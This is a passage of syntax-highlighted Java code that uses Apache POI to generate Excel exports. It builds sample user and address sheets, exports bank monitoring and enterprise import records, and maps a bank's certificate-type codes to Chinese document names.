string">"区域"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        List<span class="token operator">&lt;</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span> getAddress <span class="token operator">=</span> <span class="token function">getAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">createSheetData</span><span class="token punctuation">(</span>tmpWorkbook<span class="token punctuation">,</span> tmpAddressTitles<span class="token punctuation">,</span> <span class="token string">"地址信息"</span><span class="token punctuation">,</span> getAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>        OutputStream tmpOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"C:\\"</span> <span class="token operator">+</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".xls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tmpWorkbook<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>tmpOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        tmpOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tmpOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 测试数据     */</span>    <span class="token keyword">private</span> List<span class="token operator">&lt;</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token function">getAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        List<span class="token operator">&lt;</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span> address <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            String<span class="token punctuation">[</span><span class="token punctuation">]</span> addr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            addr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"四川"</span><span class="token punctuation">;</span>            addr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"高新 - "</span> <span class="token operator">+</span> i<span class="token punctuation">;</span>            address<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> address<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 测试数据     */</span>    <span class="token keyword">private</span> List<span class="token operator">&lt;</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token function">getUsers</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        List<span class="token operator">&lt;</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span> users <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            String<span class="token punctuation">[</span><span class="token punctuation">]</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            user<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"zhangsan - "</span> <span class="token operator">+</span> i<span class="token punctuation">;</span>            user<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"男"</span><span class="token punctuation">;</span>            user<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"2"</span> <span class="token operator">+</span> i<span class="token punctuation">;</span>            user<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Java - "</span> <span class="token operator">+</span> i<span class="token punctuation">;</span>            users<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> users<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">createExcel</span><span class="token punctuation">(</span>HttpServletResponse response<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>TMonitorReport<span class="token operator">></span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            List<span class="token operator">&lt;</span>String<span class="token operator">></span> title <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"ent_cert_type"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"bank_uid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"bank_social_no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"bank_ent_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的工作书册 Workbook,对应到一个excel文档</span>            HSSFWorkbook workbook <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HSSFWorkbook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            HSSFCellStyle style <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 生成一个字体</span>            HSSFFont font <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 字体增粗</span>            <span class="token comment" spellcheck="true">//font.setBoldweight(HSSFFont.BOLDWEIGHT_BOLD);</span>            font<span class="token punctuation">.</span><span class="token function">setFontHeightInPoints</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            style<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span>font<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的工作sheet,对应到一个excel文档的tab</span>            HSSFSheet sheet <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createSheet</span><span class="token punctuation">(</span><span class="token string">"sheet1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的sheet的一行 (表头)</span>            HSSFRow row <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 表头内容填充</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> title<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 设置excel每列宽度</span>                sheet<span class="token punctuation">.</span><span class="token function">setColumnWidth</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                HSSFCell cell <span class="token operator">=</span> row<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>title<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>style<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 创建内容行</span>            HSSFCellStyle cellStyle <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cellStyle<span class="token punctuation">.</span><span class="token function">setWrapText</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 自动换行</span><span class="token comment" spellcheck="true">//            cellStyle.setDataFormat(HSSFDataFormat.getBuiltinFormat("0.00"));</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                HSSFRow contentRow <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                TMonitorReport tMonitorReport <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>                String entCertType <span class="token operator">=</span> <span class="token function">getCertType</span><span class="token punctuation">(</span>tMonitorReport<span class="token punctuation">.</span><span class="token function">getEntCertType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                String bankUid <span class="token operator">=</span> tMonitorReport<span class="token punctuation">.</span><span class="token function">getBankUid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                String bankSocialNo <span class="token operator">=</span> tMonitorReport<span class="token punctuation">.</span><span class="token function">getEntNo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                String bankEntName <span class="token operator">=</span> tMonitorReport<span class="token punctuation">.</span><span class="token function">getEntName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> title<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    HSSFCell cell <span class="token operator">=</span> contentRow<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">switch</span> <span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>entCertType<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>bankUid<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>bankSocialNo<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>bankEntName<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">default</span><span class="token operator">:</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>cellStyle<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token function">writeExcelIo</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span> workbook<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">createExcelmportEntQz</span><span class="token punctuation">(</span>HttpServletResponse response<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>ImportEntQz<span class="token operator">></span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            List<span class="token operator">&lt;</span>String<span class="token operator">></span> title <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"bankUid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"entName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"NSRSBH"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"SHXYDM"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的工作书册 Workbook,对应到一个excel文档</span>            HSSFWorkbook workbook <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HSSFWorkbook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            HSSFCellStyle style <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 生成一个字体</span>            HSSFFont font <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 字体增粗</span>            <span class="token comment" spellcheck="true">//font.setBoldweight(HSSFFont.BOLDWEIGHT_BOLD);</span>            font<span class="token punctuation">.</span><span class="token function">setFontHeightInPoints</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            style<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span>font<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的工作sheet,对应到一个excel文档的tab</span>            HSSFSheet sheet <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createSheet</span><span class="token punctuation">(</span><span class="token string">"sheet1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的sheet的一行 (表头)</span>            HSSFRow row <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 表头内容填充</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> title<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 设置excel每列宽度</span>                sheet<span class="token punctuation">.</span><span class="token function">setColumnWidth</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                HSSFCell cell <span class="token operator">=</span> row<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>title<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>style<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 创建内容行</span>            HSSFCellStyle cellStyle <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cellStyle<span class="token punctuation">.</span><span class="token function">setWrapText</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 自动换行</span><span class="token comment" spellcheck="true">//            cellStyle.setDataFormat(HSSFDataFormat.getBuiltinFormat("0.00"));</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                HSSFRow contentRow <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                ImportEntQz importEntQz <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>                String bankUid <span class="token operator">=</span> importEntQz<span class="token punctuation">.</span><span class="token function">getBankUid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                String entName <span class="token operator">=</span> importEntQz<span class="token punctuation">.</span><span class="token function">getEntName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                String NSRSBH <span class="token operator">=</span> importEntQz<span class="token punctuation">.</span><span class="token function">getNSRSBH</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                String SHXYDM <span class="token operator">=</span> importEntQz<span class="token punctuation">.</span><span class="token function">getSHXYDM</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> title<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    HSSFCell cell <span class="token operator">=</span> contentRow<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">switch</span> <span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>bankUid<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>entName<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>NSRSBH<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>SHXYDM<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">default</span><span class="token operator">:</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>cellStyle<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token function">writeExcelIo</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span> workbook<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*泉州银行证件类型配置*/</span>    <span class="token keyword">public</span> String <span class="token function">getCertType</span><span class="token punctuation">(</span>String certType<span class="token punctuation">)</span> <span class="token punctuation">{</span>        String entCertType <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span>certType<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token string">"0"</span><span class="token operator">:</span>                entCertType <span class="token operator">=</span> <span class="token string">"身份证"</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"1"</span><span class="token operator">:</span>                entCertType <span class="token operator">=</span> <span class="token string">"户口簿"</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"2"</span><span class="token operator">:</span>                entCertType <span class="token operator">=</span> <span class="token string">"护照"</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"3"</span><span class="token operator">:</span>                entCertType <span class="token operator">=</span> <span class="token string">"军官证"</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"4"</span><span class="token operator">:</span>                entCertType <span class="token operator">=</span> <span class="token string">"士兵证"</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"5"</span><span class="token operator">:</span>                entCertType <span class="token operator">=</span> <span class="token string">"港澳居民来往内地通行证"</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"6"</span><span class="token operator">:</span>                entCertType <span class="token operator">=</span> <span class="token string">"台湾同胞来往内地通行证"</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"7"</span><span class="token operator">:</span>                entCertType <span class="token operator">=</span> <span class="token string">"临时身份证"</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"8"</span><span class="token operator">:</span>                entCertType <span class="token operator">=</span> <span class="token string">"外国人居留证"</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"9"</span><span class="token operator">:</span>                entCertType <span class="token operator">=</span> <span class="token string">"警官证"</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"99"</span><span class="token operator">:</span>                entCertType <span class="token operator">=</span> <span class="token string">"其他证件-个人"</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"X"</span><span class="token operator">:</span>                entCertType <span class="token operator">=</span> <span class="token string">"其他证件"</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"a"</span><span class="token operator">:</span>                entCertType <span class="token operator">=</span> <span class="token string">"组织机构代码证"</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"b"</span><span class="token operator">:</span>                entCertType <span class="token operator">=</span> <span class="token string">"营业执照"</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"c"</span><span class="token operator">:</span>                entCertType <span class="token operator">=</span> <span class="token string">"贷款卡"</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"g"</span><span class="token operator">:</span>                entCertType <span class="token operator">=</span> <span class="token string">"统一社会信用代码证"</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"h"</span><span class="token operator">:</span>                entCertType <span class="token operator">=</span> <span class="token string">"批文"</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"i"</span><span class="token operator">:</span>                entCertType <span class="token operator">=</span> <span class="token string">"主管证明"</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"j"</span><span class="token operator">:</span>                entCertType <span class="token operator">=</span> <span class="token string">"民办非企业登记证书"</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"k"</span><span class="token operator">:</span>                entCertType <span class="token operator">=</span> <span class="token string">"社会团体法人登记证书"</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"l"</span><span class="token operator">:</span>                entCertType <span class="token operator">=</span> <span class="token string">"事业单位法人登记证书"</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"m"</span><span class="token operator">:</span>                entCertType <span class="token operator">=</span> <span class="token string">"港澳台居民居住证"</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token operator">:</span>                entCertType <span class="token operator">=</span> <span class="token string">"error"</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> entCertType<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">createImpQz</span><span class="token punctuation">(</span>HttpServletResponse response<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>ImportEntQz<span class="token operator">></span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token 